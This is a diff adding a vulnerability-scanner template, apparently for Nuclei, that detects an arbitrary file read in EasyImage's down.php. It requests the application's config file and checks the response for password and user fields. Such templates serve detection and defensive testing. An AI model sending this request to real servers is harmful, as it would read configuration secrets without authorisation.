@@ -1,0 +1,23 @@
+id: easyimage-down-any-fileread
+info:
+  name: "EasyImage down.php 任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: easyimage
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/application/down.php?dw=./config/config.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "'password'=>'"
+          - "'user'=>'"
+          - "'imgurl'=>'"
+          - "'waterText'=>'"
+          - "'domain'=>'"
